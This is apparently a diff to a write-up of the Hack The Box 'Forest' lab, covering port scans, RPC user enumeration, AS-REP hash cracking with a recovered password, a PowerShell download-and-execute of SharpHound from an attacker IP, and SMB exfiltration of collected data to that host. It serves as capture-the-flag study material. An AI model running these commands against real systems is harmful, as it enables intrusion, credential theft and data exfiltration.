@@ -18,7 +18,7 @@ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/
 
 ### UDP Scan
 ```bash
-nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
+nmap -sU -p- --min-rate 10000 10.10.10.161
 ```
 
 ---
@@ -29,12 +29,15 @@ nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
 ```bash
 dig @10.10.10.161 htb.local
 dig @10.10.10.161 forest.htb.local
-dig axfr @10.10.10.161 htb.local  # failed zone transfer
+dig axfr @10.10.10.161 htb.local
 ```
 
 ### Enumerating Users via [RPC](RPC.md)
 ```bash
 rpcclient -U "" -N 10.10.10.161
+```
+
+```
 rpcclient $> enumdomusers
 rpcclient $> enumdomgroups
 rpcclient $> querygroupmem 0x200
@@ -68,8 +71,8 @@ done
 ### Crack the Hash
 ```bash
 hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
-# Password: s3rvice
 ```
+##### Password: s3rvice
 
 ---
 
@@ -91,15 +94,18 @@ type C:\Users\svc-alfresco\Desktop\user.txt
 
 ### Load SharpHound
 ```powershell
-iex(New-Object Net.WebClient).DownloadString("http://<your_ip>/SharpHound.ps1")
+iex(New-Object Net.WebClient).DownloadString("http://10.10.14.18/SharpHound.ps1")
+```
+
+```
 Invoke-BloodHound -CollectionMethod All -Domain htb.local -LdapUser svc-alfresco -LdapPass s3rvice
 ```
 
 ### Exfil via SMB
 ```powershell
-net use \\<your_ip>\share /u:df df
-copy 202XXXXX_BloodHound.zip \\<your_ip>\share\
-net use /d \\<your_ip>\share
+net use \\10.10.14.18\share /u:df df
+copy 202XXXXX_BloodHound.zip \\10.10.14.18\share\
+net use /d \\10.10.14.18\share
 ```
 
 ---
@@ -158,4 +164,6 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ---
 
-Let me know if you want this one exported as a markdown file or added to a master write-up! 🛠️🗒️
+https://youtu.be/LcROWwoyOxU?feature=shared
+
+https://www.youtube.com/watch?v=H9FcE_FMZio
